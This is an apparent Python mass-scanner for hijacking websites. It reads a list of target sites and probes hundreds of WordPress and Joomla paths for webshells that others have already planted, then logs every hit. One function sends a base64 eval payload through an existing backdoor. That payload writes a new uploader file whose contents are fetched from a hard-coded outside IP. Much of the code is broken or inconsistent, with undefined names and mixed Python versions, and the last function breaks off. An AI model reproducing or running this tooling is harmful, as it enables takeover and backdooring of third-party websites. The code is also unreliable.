import requests
import random
import string
import base64
import sys
import re
from multiprocessing.dummy import Pool
from colorama import Fore, init

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

init(autoreset=True)

fr = Fore.RED
fg = Fore.GREEN

banner = '''{}
           
[#] Create By ::


   ___          ___ __              
  / _ \___ ____/ (_) /___ _____ _   
 / , _/ _ `/ _  / / __/ // / _ `/   
/_/|_|\_,_/\_,_/_/\__/\_, /\_,_/    
                     /___/          
                     
   
   Contact Me On Telegram : @Radityacy
   Friends : @mrd4nd2 @Rymux @Kamaruko @xequille @xxeel1337


\n'''.format(fr)
print(banner)
requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('/')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

class Eval:
    def __init__(self):
        self.headers = {'Connection': 'keep-alive',
                        'Cache-Control': 'max-age=0',
                        'Upgrade-Insecure-Requests': '1',
                        'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                        'Accept-Encoding': 'gzip, deflate',
                        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
                        'referer': 'www.google.com'}

        self.shell_content = """<?php echo "Black Bot";?>"""

    def url_domain(self, site):
        if site.startswith("http://"):
            site = site.replace("http://", "")
        elif site.startswith("https://"):
            site = site.replace("https://", "")
        else:
            pass
        pattern = re.compile('(.*)/')
        while re.findall(pattern, site):
            sitez = re.findall(pattern, site)
            site = sitez[0]
        return site

    def ran(self, length):
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for i in range(length))

    def ba_blue(self, site):
        try:
            url = "http://" + self.url_domain(site)
            filename = "uploader.php"
            backdoors = """$x=fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/wp-admin/css/colors/blue/"""+filename+"""','w+'),file_get_contents('http://51.79.124.111/vz.txt'));echo "aDriv4".$x;"""
            encoded_php = base64.b64encode(backdoors.encode()).decode()
            response = requests.get(url + "/wp-admin/css/colors/blue/blue.php?wall=ZWNobyBhRHJpdjQ7ZXZhbCgkX1BPU1RbJ3Z6J10pOw==" + encoded_php, headers=self.headers).content.decode()
            if 'aDriv4' in response:
                print("Target:{} {} Success Vulnerability ".format(url, fg))
                open('bk.txt', 'a').write(url + "/wp-admin/css/colors/blue/" + filename + "\n")
            else:
                print("Target:{} {} Not Vulnerability ".format(url, fr))
        except:
            pass

code_shell = Eval()

Pathhlist = ['/.well-known/wso112233.php','/wso112233.php','/.well-knownold/wso112233.php','/.well-known/acme-challenge/wso112233.php','/.well-known/pkivalidation/wso112233.php','/wp-content/plugins/wso112233.php','/wp-content/uploads/wso112233.php','/wp-content/wso112233.php','/wp-includes/wso112233.php','/wp-admin/wso112233.php','/wp-content/themes/wso112233.php','/.well-known/shell20211028.php','/shell20211028.php','/.well-knownold/shell20211028.php','/.well-known/acme-challenge/shell20211028.php','/.well-known/pkivalidation/shell20211028.php','/wp-content/plugins/shell20211028.php','/wp-content/uploads/shell20211028.php','/wp-content/shell20211028.php','/wp-includes/shell20211028.php','/wp-admin/shell20211028.php','/wp-content/themes/shell20211028.php','/.well-known/bala.php','/bala.php','/.well-knownold/bala.php','/.well-known/acme-challenge/bala.php','/.well-known/pkivalidation/bala.php','/wp-content/plugins/bala.php','/wp-content/uploads/bala.php','/wp-content/bala.php','/wp-includes/bala.php','/wp-admin/bala.php','/wp-content/themes/bala.php','/dropdown.php','/wp-content/dropdown.php','/wp-includes/dropdown.php','/wp-admin/dropdown.php']

Pathliist = ['/million.php','/404.php','/wp-admin/css/index.php','/ioxi2.php','/wp-content/themes/about.php','/4pric.php','/wp-content/style-css.php','/oxi-rex.php','/wp-content/themes/twenty/twenty.php']

Pathlisttt = ['/wp-content/plugins/envato-market/inc/class-envato-market-api.php']

Wso = ['/ioxi-rex4.php7','/wp-content/plugins/seoo/alfa-ioxi.php','/wp-content/plugins/classic-editor/wp-login.php']

Joomla = ['/updates.php','/libraries/legacy/updates.php','/libraries/phpmailer/updates.php','/libraries/vendor/updates.php']

def multiblackbot(url):
    try:
        url = 'http://' + code_shell.url_domain(url)
        check = requests.get(url + '/simple.php', headers=code_shell.headers, allow_redirects=True, timeout=15)
        if '{Ninja-Shell}' in check.content.decode():
            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
            open('ninja.txt', 'a').write(url + '/simple.php\n')
        else:

            url = 'https://' + code_shell.url_domain(url)
            check = requests.get(url + '/shell20211028.php', headers=code_shell.headers, allow_redirects=True, verify=False, timeout=15)
            if 'Uname:' in check.content.decode():
                print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
                open('wso-shell.txt', 'a').write(url + '/shell20211028.php\n')
            else:
                print(' -| ' + url + ' --> {}[Failed]'.format(fr))
    except:
        print(' -| ' + url + ' --> {}[Failed]'.format(fr))
            
def raditya(url):
		try:
			
			url = "http://" + self.URLdomain(site)
			for Path in Pathhlist:
				check = requests.get(url + Path, headers=self.headers, verify=False, timeout=25).content
				if("Uname:" in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('wso-shell.txt','a').write(url + Path + "\n")
					break
				else:
					print('Target:{} -->! {}[Failid]').format(url, fr)
					
		except:
			pass
			
def dandier(url):
		try:
			
			url = "http://" + self.URLdomain(site)
			for Path in Pathliist:
				check = requests.get(url + Path, headers=self.headers, verify=False, timeout=25).content
				if("Uname:" in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('w-shell.txt','a').write(url + Path + "\n")
					break
				else:
					print('Target:{} -->! {}[Failid]').format(url, fr)
					
		except:
			pass
			
#SEO
def show(url):
		try:
			
			url = "http://" + self.URLdomain(site)
			for Path in Pathlisttt:
				check = requests.get(url + Path, headers=self.headers, verify=False, timeout=25).content
				if("Upload File : <input" in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('seo-shell.txt','a').write(url + Path + "\n")
					break
				else:
					print('Target:{} -->! {}[Failid]').format(url, fr)
					
		except:
			pass
			
#IDK
def FourHundredThree(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/.well-known/acme-challenge/license.php',headers=headers, allow_redirects=True,timeout=15)
        if 'class="form-control" placeholder="@Passwrd" type="password" name="getpwd"' in check.content:
                print(' -| ' + url_https + ' --> [Successfully]')
                open('license-Shells.txt', 'a').write(url + '/.well-known/acme-challenge/license.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/cjfuns.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Doc Root:' in check.content:
                    print(' -| ' + url_https + ' --> [Successfully]')
                    open('cjfuns-Shells.txt', 'a').write(url + '/cjfuns.php')
            else:
                print(' -| ' + url_https + ' --> [Successfully]')
    except :
        print(' -| ' + url_https + ' --> [Successfully]')
        
def maul(url):
		try:
			
			url = "http://" + self.URLdomain(site)
			for Path in Wso:
				check = requests.get(url + Path, headers=self.headers, verify=False, timeout=25).content
				if("Yanz Webshell!" in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('Yanzvuln.txt','a').write(url + Path + "\n")
					break
				else:
					print('Target:{} -->! {}[Failid]').format(url, fr)
					
		except:
			pass
			
def ya(self, site):
		try:
			
			url = "http://" + self.URLdomain(site)
			for Path in Joomla:
				check = requests.get(url + Path, headers=self.headers, verify=False, timeout=25).content
				if("WSO 4.2.6" in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('vuln.txt','a').write(url + Path + "\n")
					break
				else:
					print('Target:{} -->! {}[Failid]').format(url, fr)
					
		except:
			pass
			
def dia(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/cong.php',headers=headers, allow_redirects=True,timeout=15)
        if 'form method="POST"><input type="password" name="getpwd"' in check.content:
                print(' -| ' + url_https + ' --> [Successfully]')
                open('cong.txt', 'a').write(url + '/wp-content/cong.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/ango/sett.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<pre align=center><form method=post>Password:' in check.content:
                    print(' -| ' + url_https + ' --> [Successfully]')
                    open('sett.txt', 'a').write(url + '/wp-content/plugins/ango/sett.php\n')
            else:
                print('Target:{} -->! {}[Failid]').format(url, fr)
    except :
        print('Target:{} -->! {}[Failid]').format(url, fr)
			
def rawr(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/hellopress/wp_filemanager.php',headers=headers, allow_redirects=True,timeout=15)
        if 'PHP File Manager' in check.content:
                print('Target:{} -->! {}[Succefully]').format(url, fr)
                open('PHPFileManager.txt', 'a').write(url + '/wp-content/plugins/hellopress/wp_filemanager.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/hellopress/wp_filemanager.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'PHP File Manager' in check.content:
                    print('Target:{} -->! {}[Succesfully]').format(url, fr)
                    open('PHPFileManager.txt', 'a').write(url + '/wp-content/plugins/hellopress/wp_filemanager.php\n')
            else:
                print('Target:{} -->! {}[Failid]').format(url, fr)
    except :
        print('Target:{} -->! {}[Failid]').format(url, fr)
        
def Exploiter(url):
    try:
        paths = ['/wp-content/plugins/ccx/index.php', '/ccx/index.php', '/xt/index.php', '/xleet-shell.php', '/xleet.php', '/xleetshell.php', '/wp-admin/includes/xleet-shell.php', '/wp-content/plugins/content-management/content.php', '/xlt.php', '/wp-content/plugins/xt/index.php', '/wp-content/xleet.php', '/xleet.php', '/wp-admin/xleet-shell.php']
        for path in paths:
            try:
                exploit_point = 'http://'+ URLdomain(url) + path
                check = requests.get(exploit_point, verify=False,headers=headers,timeout=20).content
                if '<pre align=center><form method=post>Password<br><input type=password name=pass' in check:
                    print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                    open('xleet-shell.txt', 'a').write(exploit_point +'\n')
                    uploader(exploit_point)
                else:
                    exploit_point = 'https://'+ URLdomain(url)+ path
                    check = requests.get(exploit_point, verify=False,headers=headers,timeout=20).content
                    if '<pre align=center><form method=post>Password<br><input type=password name=pass' in check:
                        print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                        open('xleet-shell.txt', 'a').write(exploit_point +'\n')
                        uploader(exploit_point)
                    else:
                        print ' -| ' + url + ' --> {}[Failed]'.format(fr)
            except:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
    except :
        print ' -| ' + url + ' --> {}[Failed]'.format(fr)
      
def loalah(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/seoplugins/mar.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/mar.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/seoplugins/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/mar.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/themes/seotheme/mar.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-content/themes/seotheme/mar.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/themes/seotheme/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-content/themes/seotheme/mar.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/images/mar.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/images/mar.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/images/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/images/mar.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/m4r1ju4n4.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/m4r1ju4n4.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/m4r1ju4n4.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/m4r1ju4n4.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr)) 
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/marijuana.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/marijuana.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/marijuana.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/marijuana.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/css/colors/coffee/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-admin/css/colors/coffee/mari.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/css/colors/coffee/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-admin/css/colors/coffee/mari.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/css/colors/coffee/marijuana.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-admin/css/colors/coffee/marijuana.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/css/colors/coffee/marijuana.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-admin/css/colors/coffee/marijuana.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/css/colors/maro.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-admin/css/colors/maro.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/css/colors/maro.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-admin/css/colors/maro.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr)) 
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/css/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-admin/css/mari.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/css/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-admin/css/mari.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/owfsmac/mar.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-content/plugins/owfsmac/mar.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/owfsmac/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-content/plugins/owfsmac/mar.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/css/maro.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-admin/css/maro.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/css/maro.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-admin/css/maro.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/includes/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-admin/includes/mari.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/includes/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-admin/includes/mari.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))   
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/maint/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-admin/maint/mari.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/maint/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-admin/maint/mari.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-admin/mari.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-admin/mari.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-content/mari.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-content/mari.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/aryabot/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-content/plugins/aryabot/mari.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/aryabot/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-content/plugins/aryabot/mari.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr)) 
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/aryabot/mar.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-content/plugins/aryabot/mar.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/aryabot/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-content/plugins/aryabot/mar.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/owfsmac/maro.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-content/plugins/owfsmac/maro.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/owfsmac/maro.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-content/plugins/owfsmac/maro.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                open('Shells.txt', 'a').write(url + '/wp-includes/mari.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                    print ('\033[0;32mScanning-->' + url + ' --> {}[Uploaded]'.format(fg))
                    open('Shells.txt', 'a').write(url + '/wp-includes/mari.php\n')
            else:
                print ('Scanning-->' + url + ' --> {}[Not Vuln]'.format(fr))                 
    except :
        print ('\033[0;31mDEAD-->' + url + ' --> {}[No Response]'.format(fr))
        
        
def backdoor1(url) :
    try:
        link = 'http://'+url+'/wp-content/updates.php'
        checking_source = requests.get(link, verify=False,headers=headers).text
        if '<input type="submit" name="submit" value="  >>">' in checking_source :
            upd(url=link)
            check_if_working(liness=link)
            print(fy+'trying to upload Shell wso >>>   '+link)
            open('wso.txt','a').write(link+'\n')
        else :
            print('Ignore >>>    '+link)
    except :
        pass
def backdoor2(url) :
    try:
        link = 'http://'+url+'/alfa-rex.php7'
        checking_source = requests.get(link, verify=False,headers=headers).text
        if '<span>Upload file:</span>' in checking_source :
            check_if_working(liness=link)
            yy(url=link)
            print(fy+'trying to upload Shell wso >>>   '+link)
            open('wso.txt','a').write(link+'\n')
        else :
            replace_second = link.replace('alfa-rex.php7','alfa-rex.php')
            checking_source = requests.get(replace_second, verify=False,headers=headers).text
            if '<span>Upload file:</span>' in checking_source :
                print('[+] >>  extracted >>> '+ replace_second)
                check_if_working(liness=replace_second)
                yy(url=replace_second)
                open('wso.txt','a').write(replace_second+'\n')
            else :
                print(fr+'Ignore >>>    '+replace_second)
    except :
        pass
        
def gadaa(url):
    try:
        head = {'User-agent': 'Mozilla/5.0 (Linux; Android 11; M2010J19SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'}
        exp = requests.get(url+'/wp-content/plugins/TOPXOH/wDR.php', headers=head, timeout=10).text
        if 'FilesMan' in exp:
            print(fg+'[==] '+fc+url+fg+' [ FOUND ]')
            open('Shellz.txt', 'a').write(url+'/wp-content/plugins/TOPXOH/wDR.php'+'\n')
        else:
            print(fg+'[==] '+fc+url+fr+' [ FAILED ]')
    except:
        pass
        
def pelisa(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/themes/mero-magazine/ws.php',headers=headers, allow_redirects=True,timeout=15)
        if " - WSO 5.5</title>" in check.content:
                print '-| ' + url + ('--> {}[Succefully]').format(fg)
                open('Shells.txt', 'a').write(url + '/wp-content/themes/mero-magazine/ws.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/themes/mero-magazine/ws.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if " - WSO 5.5</title>" in check.content:
                    print '-| ' + url + ('--> {}[Succefully]').format(fg)
                    open('Shells.txt', 'a').write(url + '/wp-content/themes/mero-magazine/ws.php\n')
            else:
                print '-| ' + url + ('>{}[Failed]').format(fr)
